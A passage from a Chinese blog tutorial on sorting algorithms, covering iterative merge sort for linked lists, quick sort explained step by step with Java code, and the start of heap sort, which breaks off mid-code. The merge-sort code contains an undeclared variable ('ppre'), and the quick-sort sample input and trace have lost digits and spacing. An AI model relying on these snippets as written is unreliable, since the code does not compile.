class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">sortList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        <span class="hljs-comment">//初始化变量</span><br>        ListNode h,h1,h2,res,pre;<br>        h = head;<br>        <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>,step = <span class="hljs-number">1</span>;<br>        res = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>        res.next = head;<br>        <span class="hljs-keyword">while</span>(h != <span class="hljs-keyword">null</span>)&#123;<br>            length++;<br>            h = h.next;<br>        &#125;<br><br>        <span class="hljs-comment">//迭代合并</span><br>        <span class="hljs-keyword">while</span> (step &lt; length) &#123;<br>            pre = res;<br>            h = res.next;<br>            <span class="hljs-keyword">while</span>(h != <span class="hljs-keyword">null</span>)&#123;<br>                h1 = h;<br>                <span class="hljs-keyword">int</span> i = step;<br>                <span class="hljs-keyword">while</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; h != <span class="hljs-keyword">null</span>)&#123;<br>                    h = h.next;<br>                    i--;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-comment">//此时不足one step</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                h2 = h;<br>                i = step;<br>                <span class="hljs-keyword">while</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; h != <span class="hljs-keyword">null</span>)&#123;<br>                    h = h.next;<br>                    i--;<br>                &#125;<br>                <span class="hljs-comment">//合并两组中前一组长度step，后一组step-i</span><br>                <span class="hljs-keyword">int</span> len1 = step,len2 = step - i;<br>                <span class="hljs-comment">//开始合并,有序链表合并</span><br>                <span class="hljs-keyword">while</span>(len1 &gt; <span class="hljs-number">0</span> &amp;&amp; len2 &gt; <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(h1.val &lt;= h2.val)&#123;<br>                        len1--;<br>                        pre.next = h1;<br>                        h1 = h1.next;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        len2--;<br>                        pre.next = h2;<br>                        h2 = h2.next;<br>                    &#125;<br>                    pre = pre.next;<br>                &#125;<br>                ppre.next = len1 == <span class="hljs-number">0</span> ? h2 : h1;<br>                <span class="hljs-keyword">while</span>(len1 &gt; <span class="hljs-number">0</span> || len2 &gt; <span class="hljs-number">0</span>)&#123;<br>                    pre = pre.next;<br>                    len1--;<br>                    len2--;<br>                &#125;<br>                <span class="hljs-comment">//把当前合并链表尾节点和下一个待合并链表头节点连接</span><br>                pre.next = h;<br>                <br>            &#125;    <br>            step *= <span class="hljs-number">2</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res.next;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>对两种方法的思考:</strong></p><p>图解上看，迭代方法好像是跳过了递归的划分过程直接进行合并简化了，但是划分的意义在于怎么划分的就怎么合并，如果直接合并的话，比如两两合并，出现奇数就要特殊处理，四四合并出现不足四的数也要特殊处理，这是在弥补没有划分的坑。</p><p><strong>最后</strong></p><p>　　归并排序是稳定排序，它也是一种十分高效的排序，能利用完全二叉树特性的排序一般性能都不会太差。java中Arrays.sort()采用了一种名为TimSort的排序算法，就是归并排序的优化版本。从上文的图中可看出，每次合并操作的平均时间复杂度为O(n)，而完全二叉树的深度为|log2n|。总的平均时间复杂度为O(nlogn)。而且，归并排序的最好，最坏，平均时间复杂度均为O(nlogn)。</p><h1 id="6-快速排序"><a href="#6-快速排序" class="headerlink" title="6. 快速排序"></a>6. 快速排序</h1><p><a href="https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html">https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html</a></p><p>冒泡排序的时间复杂度达到了 <strong>O(N2)</strong>。假如我们的计算机每秒钟可以运行 <strong>10</strong> 亿次，那么对 <strong>1</strong> 亿个数进行排序，桶排序则只需要 <strong>0.1</strong> 秒，而冒泡排序则需要 <strong>1</strong> 千万秒，达到 <strong>115</strong> 天之久，是不是很吓人。那有没有既不浪费空间又可以快一点的排序算法呢？那就是“快速排序”啦！光听这个名字是不是就觉得很高端呢。</p><p>假设我们现在对“<strong>6 1 2 7 9 3 4 5 10 8</strong>”这个 10 个数进行排序。首先在这个序列中随便找一个数作为基准数（不要被这个名词吓到了，就是一个用来参照的数，待会你就知道它用来做啥的了）。为了方便，就让第一个数 <strong>6</strong> 作为基准数吧。接下来，需要将这个序列中所有比基准数大的数放在 <strong>6</strong> 的右边，比基准数小的数放在 <strong>6</strong> 的左边，类似下面这种排列。</p><p>3 1 2 5 4 <strong>6</strong> 9 7 10 8</p><p>在初始状态下，数字 <strong>6</strong> 在序列的第 <strong>1</strong> 位。我们的目标是将 <strong>6</strong> 挪到序列中间的某个位置，假设这个位置是 <strong>k</strong>。现在就需要寻找这个 <strong>k</strong>，并且以第 <strong>k</strong> 位为分界点，左边的数都小于等于 <strong>6</strong>，右边的数都大于等于 <strong>6</strong>。想一想，你有办法可以做到这点吗？</p><p>给你一个提示吧。请回忆一下冒泡排序，是如何通过“交换”，一步步让每个数归位的。此时你也可以通过“交换”的方法来达到目的。具体是如何一步步交换呢？怎样交换才既方便又节省时间呢？先别急着往下看，拿出笔来，在纸上画画看。我高中时第一次学习冒泡排序算法的时候，就觉得冒泡排序很浪                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              费时间，每次都只能对相邻的两个数进行比较，这显然太不合理了。于是我就想了一个办法，后来才知道原来这就是“快速排序”，请允许我小小的自恋一下(^o^)。</p><p>方法其实很简单：分别从初始序列“<strong>6 1 2 7 9 3 4 5 10 8</strong>”两端开始“探测”。先从<strong>右</strong>往<strong>左</strong>找一个小于 <strong>6</strong> 的数，再从<strong>左</strong>往<strong>右</strong>找一个大于 <strong>6</strong> 的数，然后交换他们。这里可以用两个变量 <strong>i</strong> 和 <strong>j</strong>，分别指向序列最左边和最右边。我们为这两个变量起个好听的名字“哨兵 i”和“哨兵 j”。刚开始的时候让哨兵 i 指向序列的最左边（即 <strong>i=1</strong>），指向数字 <strong>6</strong>。让哨兵 <strong>j</strong> 指向序列的最右边（即 <strong>j=10</strong>），指向数字 <strong>8</strong>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.1.png" alt="img"></p><p>首先哨兵 <strong>j</strong> 开始出动。因为此处设置的基准数是最左边的数，所以需要让哨兵 <strong>j</strong> 先出动，这一点非常重要（请自己想一想为什么）。哨兵 <strong>j</strong> 一步一步地向左挪动（即 <strong>j—</strong>），直到找到一个小于 <strong>6</strong> 的数停下来。接下来哨兵 <strong>i</strong> 再一步一步向右挪动（即 <strong>i++</strong>），直到找到一个数大于 <strong>6</strong> 的数停下来。最后哨兵 <strong>j</strong> 停在了数字 <strong>5</strong> 面前，哨兵 <strong>i</strong> 停在了数字 <strong>7</strong> 面前。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.2.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.3.png" alt="img"></p><p>现在交换哨兵 <strong>i</strong> 和哨兵 <strong>j</strong> 所指向的元素的值。交换之后的序列如下。</p><p>6 1 2 <strong>5</strong> 9 3 4 <strong>7</strong> 10 8</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.4.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.5.png" alt="img"></p><p>到此，第一次交换结束。接下来开始哨兵 <strong>j</strong> 继续向左挪动（再友情提醒，每次必须是哨兵 <strong>j</strong> 先出发）。他发现了 <strong>4</strong>（比基准数 <strong>6</strong> 要小，满足要求）之后停了下来。哨兵 <strong>i</strong> 也继续向右挪动的，他发现了 <strong>9</strong>（比基准数 <strong>6</strong> 要大，满足要求）之后停了下来。此时再次进行交换，交换之后的序列如下。</p><p>6 1 2 5 <strong>4</strong> 3 <strong>9</strong> 7 10 8</p><p>第二次交换结束，“探测”继续。哨兵 <strong>j</strong> 继续向左挪动，他发现了 <strong>3</strong>（比基准数 <strong>6</strong> 要小，满足要求）之后又停了下来。哨兵 <strong>i</strong> 继续向右移动，糟啦！此时哨兵 <strong>i</strong> 和哨兵 <strong>j</strong> 相遇了，哨兵 <strong>i</strong> 和哨兵 <strong>j</strong> 都走到 <strong>3</strong> 面前。说明此时“探测”结束。我们将基准数 <strong>6</strong> 和 <strong>3</strong> 进行交换。交换之后的序列如下。</p><p><strong>3</strong> 1 2 5 4 <strong>6</strong> 9 7 10 8</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.6.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.7.png" alt="img"></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.8.png" alt="img"></p><p>到此第一轮“探测”真正结束。此时以基准数 <strong>6</strong> 为分界点，<strong>6</strong> 左边的数都小于等于 <strong>6</strong>，<strong>6</strong> 右边的数都大于等于 <strong>6</strong>。回顾一下刚才的过程，其实哨兵 <strong>j</strong> 的使命就是要找小于基准数的数，而哨兵 <strong>i</strong> 的使命就是要找大于基准数的数，直到 <strong>i</strong> 和 <strong>j</strong> 碰头为止。</p><p>OK，解释完毕。现在基准数 <strong>6</strong> 已经归位，它正好处在序列的第 <strong>6</strong> 位。此时我们已经将原来的序列，以 <strong>6</strong> 为分界点拆分成了两个序列，左边的序列是“<strong>3 1 2 5 4</strong>”，右边的序列是“ <strong>9 7 10 8</strong> ”。接下来还需要分别处理这两个序列。因为 <strong>6</strong> 左边和右边的序列目前都还是很混乱的。不过不要紧，我们已经掌握了方法，接下来只要模拟刚才的方法分别处理 <strong>6</strong> 左边和右边的序列即可。现在先来处理 <strong>6</strong> 左边的序列现吧。</p><p>左边的序列是“<strong>3 1 2 5 4</strong>”。请将这个序列以 <strong>3</strong> 为基准数进行调整，使得 <strong>3</strong> 左边的数都小于等于 <strong>3</strong>，<strong>3</strong> 右边的数都大于等于 <strong>3</strong>。好了开始动笔吧。</p><p>如果你模拟的没有错，调整完毕之后的序列的顺序应该是。</p><p>2 1 <strong>3</strong> 5 4</p><p>OK，现在 <strong>3</strong> 已经归位。接下来需要处理 <strong>3</strong> 左边的序列“ <strong>2 1</strong> ”和右边的序列“<strong>5 4</strong>”。对序列“ <strong>2 1</strong> ”以 <strong>2</strong> 为基准数进行调整，处理完毕之后的序列为“<strong>1 2</strong>”，到此 <strong>2</strong> 已经归位。序列“<strong>1</strong>”只有一个数，也不需要进行任何处理。至此我们对序列“ <strong>2 1</strong> ”已全部处理完毕，得到序列是“<strong>1 2</strong>”。序列“<strong>5 4</strong>”的处理也仿照此方法，最后得到的序列如下。</p><p>1 2 3 4 5 6 9 7 10 8</p><p>对于序列“<strong>9 7 10 8</strong>”也模拟刚才的过程，直到不可拆分出新的子序列为止。最终将会得到这样的序列，如下。</p><p>1 2 3 4 5 6 7 8 9 10</p><p>到此，排序完全结束。细心的同学可能已经发现，快速排序的每一轮处理其实就是将这一轮的基准数归位，直到所有的数都归位为止，排序就结束了。下面上个霸气的图来描述下整个算法的处理过程。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.9.png" alt="img" style="zoom: 67%;" /></p><p>快速排序之所比较快，因为相比冒泡排序，每次交换是跳跃式的。每次排序的时候设置一个基准点，将小于等于基准点的数全部放到基准点的左边，将大于等于基准点的数全部放到基准点的右边。这样在每次交换的时候就不会像冒泡排序一样每次只能在相邻的数之间进行交换，交换的距离就大的多了。因此总的比较和交换次数就少了，速度自然就提高了。当然在最坏的情况下，仍可能是相邻的两个数进行了交换。因此快速排序的最差时间复杂度和冒泡排序是一样的都是 <strong>O(N2)</strong>，它的平均时间复杂度为 <strong>O(NlogN)</strong>。其实快速排序是基于一种叫做“二分”的思想。我们后面还会遇到“二分”思想，到时候再聊。先上代码，如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QuickSort</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">quickSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr,<span class="hljs-keyword">int</span> low,<span class="hljs-keyword">int</span> high)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> i,j,temp,t;<br>        <span class="hljs-keyword">if</span>(low&gt;high)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        i=low;<br>        j=high;<br>        <span class="hljs-comment">//temp就是基准位</span><br>        temp = arr[low];<br> <br>        <span class="hljs-keyword">while</span> (i&lt;j) &#123;<br>            <span class="hljs-comment">//先看右边，依次往左递减</span><br>            <span class="hljs-keyword">while</span> (temp&lt;=arr[j]&amp;&amp;i&lt;j) &#123;<br>                j--;<br>            &#125;<br>            <span class="hljs-comment">//再看左边，依次往右递增</span><br>            <span class="hljs-keyword">while</span> (temp&gt;=arr[i]&amp;&amp;i&lt;j) &#123;<br>                i++;<br>            &#125;<br>            <span class="hljs-comment">//如果满足条件则交换</span><br>            <span class="hljs-keyword">if</span> (i&lt;j) &#123;<br>                t = arr[j];<br>                arr[j] = arr[i];<br>                arr[i] = t;<br>            &#125;<br> <br>        &#125;<br>        <span class="hljs-comment">//最后将基准为与i和j相等位置的数字交换</span><br>         arr[low] = arr[i];<br>         arr[i] = temp;<br>        <span class="hljs-comment">//递归调用左半数组</span><br>        quickSort(arr, low, j-<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//递归调用右半数组</span><br>        quickSort(arr, j+<span class="hljs-number">1</span>, high);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以输入以下数据进行验证</p><p>1061279345108</p><p>运行结果是</p><p>12345678910</p><p>下面是程序执行过程中数组 <strong>a</strong> 的变化过程，带下划线的数表示的已归位的基准数。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">7</span> <span class="hljs-number">9</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">10</span> <span class="hljs-number">8</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">8</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">8</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">8</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">8</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">8</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">8</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">8</span> <span class="hljs-number">7</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h1 id="7-堆排序"><a href="#7-堆排序" class="headerlink" title="7. 堆排序"></a>7. 堆排序</h1><p><strong>堆排序</strong></p><p>　　堆排序是利用<strong>堆</strong>这种数据结构而设计的一种排序算法，堆排序是一种<strong>选择排序，</strong>它的最坏，最好，平均时间复杂度均为O(nlogn)，它也是不稳定排序。首先简单了解下堆结构。</p><p><strong>堆</strong></p><p>　　<strong>堆是具有以下性质的完全二叉树：每个结点的值都大于或等于其左右孩子结点的值，称为大顶堆；或者每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆。如下图：</strong></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/11-675658660.png" alt="img" style="zoom: 33%;" /></p><p>同时，我们对堆中的结点按层进行编号，将这种逻辑结构映射到数组中就是下面这个样子</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3-2092264199.png" alt="img" style="zoom:33%;" /></p><p>该数组从逻辑上讲就是一个堆结构，我们用简单的公式来描述一下堆的定义就是：</p><p><strong>大顶堆：arr[i] &gt;= arr[2i+1] &amp;&amp; arr[i] &gt;= arr[2i+2]</strong>  </p><p><strong>小顶堆：arr[i] &lt;= arr[2i+1] &amp;&amp; arr[i] &lt;= arr[2i+2]</strong>  </p><p>ok，了解了这些定义。接下来，我们来看看堆排序的基本思想及基本步骤：</p><p><strong>堆排序基本思想及步骤</strong></p><p>　　<strong>堆排序的基本思想是：将待排序序列构造成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点。将其与末尾元素进行交换，此时末尾就为最大值。然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。如此反复执行，便能得到一个有序序列了</strong></p><p><strong>步骤一 构造初始堆。将给定无序序列构造成一个大顶堆（**</strong>一般升序采用大顶堆，降序采用小顶堆<strong>**)。</strong></p><p>假设给定无序序列结构如下</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/51-934327647.png" alt="img" style="zoom: 50%;" /></p><p>此时我们从最后一个非叶子结点开始（叶结点自然不用调整，第一个非叶子结点 arr.length/2-1=5/2-1=1，也就是下面的6结点），从左至右，从下至上进行调整。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/33-270379236.png" alt="img" style="zoom: 33%;" /></p><p>找到第二个非叶节点4，由于[4,9,8]中9元素最大，4和9交换。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/6-1823585260.png" alt="img" style="zoom:33%;" /></p><p>这时，交换导致了子根[4,5,6]结构混乱，继续调整，[4,5,6]中6最大，交换4和6。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/6-1142194411.png" alt="img" style="zoom: 33%;" /></p><p>此时，我们就将一个无需序列构造成了一个大顶堆。</p><p><strong>步骤二 将堆顶元素与末尾元素进行交换，使末尾元素最大。然后继续调整堆，再将堆顶元素与末尾元素交换，得到第二大元素。如此反复进行交换、重建、交换。</strong></p><p>a.将堆顶元素9和末尾元素4进行交换</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/0-1455153342.png" alt="img" style="zoom:33%;" /></p><p>b.重新调整结构，使其继续满足堆定义</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/5-1280388728.png" alt="img" style="zoom:33%;" /></p><p>c.再将堆顶元素8与末尾元素5进行交换，得到第二大元素8.</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/9-1114983222.png" alt="img" style="zoom:33%;" /></p><p>后续过程，继续进行调整，交换，如此反复进行，最终使得整个序列有序</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/29-935654830.png" alt="img" style="zoom: 50%;" /></p><p>再简单总结下堆排序的基本思路：</p><p>　　<strong>a.将无需序列构建成一个堆，根据升序降序需求选择大顶堆或小顶堆;</strong></p><p>　　<strong>b.将堆顶元素与末尾元素交换，将最大元素”沉”到数组末端;</strong></p><p>　　<strong>c.重新调整结构，使其满足堆定义，然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个序列有序。</strong></p><p><strong>代码实现</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sortdemo;<br><br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 堆排序demo</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeapSort</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String []args)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>&#125;;<br>        sort(arr);<br>        System.out.println(Arrays.toString(arr));<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> []arr)</span></span>&#123;<br>        <span class="hljs-comment">//1.构建大顶堆</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = arr.length / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>;i &gt;= <span class="hljs-number">0</span>;i--)&#123;<br>            <span class="hljs-comment">//从第一个非叶子结点从下至上，从右至左调整结构</span><br>            adjustHeap(arr,i,arr.length);<br>        &#125;<br>        <span class="hljs-comment">//2.调整堆结构+交换堆顶元素与末尾元素</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = arr.length - <span class="hljs-number">1</span>;j &gt; <span class="hljs-number">0</span>;j--)&#123;<br>            swap(arr,<span class="hljs-number">0</span>,j);<span class="hljs-comment">//将堆顶元素与末尾元素进行交换</span><br>            adjustHeap(arr,<span class="hljs-number">0</span>,j);<span class="hljs-comment">//重新对堆进行调整</span><br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 调整大顶堆（仅是调整过程，建立在大顶堆已构建的基础上）</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> arr</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> i</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> length</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">adjustHeap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> []arr,<span class="hljs-keyword">int</span> i,<span class="hljs-keyword">int</span> length)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> temp = arr[i];<span class="hljs-comment">//先取出当前元素i</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;k &lt; length; k = k * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//从i结点的左子结点开始，也就是2i+1处开始</span><br>            <span class="hljs-keyword">if</span>(k + <span class="hljs-number">1</span> &lt; length &amp;&amp; arr[k] &lt; arr[k+<span class="hljs-number">1</span>])&#123;<span class="hljs-comment">//如果左子结点小于右子结点，k指向右子结点</span><br>                k++;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(arr[k] 